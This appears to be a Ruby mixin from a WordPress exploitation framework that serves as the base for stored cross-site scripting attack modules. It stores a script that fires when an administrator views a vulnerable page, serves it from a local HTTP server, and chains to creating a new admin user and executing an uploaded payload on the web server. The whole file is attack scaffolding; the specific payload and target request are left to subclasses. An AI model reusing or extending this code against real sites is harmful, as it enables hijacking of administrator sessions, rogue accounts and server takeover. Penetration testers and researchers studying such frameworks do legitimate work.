# Provides reusable functionality for stored XSS modules.
module Wpxf::WordPress::StoredXss
  include Wpxf::WordPress::Xss

  # Initialize a new instance of {StoredXss}.
  def initialize
    super
    @success = false
    @info[:desc] = 'This module stores a script in the target system that '\
                   'will execute when an admin user views the vulnerable page, '\
                   'which in turn, will create a new admin user to upload '\
                   'and execute the selected payload in the context of the '\
                   'web server.'
  end

  # @return [String] the URL or name of the page an admin user must view to execute the script.
  def vulnerable_page
    'a vulnerable page'
  end

  # Abstract method which must be implemented to store the XSS include script.
  # @return [Wpxf::Net::HttpResponse] the HTTP response to the request to store the script.
  def store_script
    raise 'Required method "store_script" has not been implemented'
  end

  # Call #store_script and validate the response.
  # @return [Boolean] return true if the script was successfully stored.
  def store_script_and_validate
    res = store_script

    if res.nil?
      emit_error 'No response from the target'
      return false
    end

    return true if res.code == expected_status_code_after_store

    emit_error "Server responded with code #{res.code}"
    false
  end

  # @return [Number] The status code that is expected after storing the script.
  def expected_status_code_after_store
    200
  end

  # Run the module.
  # @return [Boolean] true if successful.
  def run
    return false unless super

    emit_info 'Storing script...'
    return false unless store_script_and_validate

    emit_success "Script stored and will be executed when a user views #{vulnerable_page}"
    start_http_server

    xss_shell_success
  end
end
